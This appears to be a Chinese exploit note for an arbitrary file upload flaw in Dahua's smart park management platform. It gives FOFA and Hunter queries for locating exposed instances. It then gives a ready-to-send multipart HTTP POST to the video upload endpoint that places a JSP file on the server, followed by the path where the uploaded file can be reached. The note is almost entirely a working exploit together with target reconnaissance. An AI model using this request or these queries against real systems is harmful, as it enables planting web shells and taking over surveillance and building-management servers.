# 大华 智慧园区综合管理平台 video 任意文件上传漏洞

## 网络测绘

fofa: app="dahua-智慧园区综合管理平台"

hunter: app.name="Dahua 大华 智慧园区管理平台"

## POC / EXP

```
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"

Test
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"

submit
--dd8f988919484abab3816881c55272a7--
```

```
/publishingImg/VIDEO/230812152005170200.jsp
```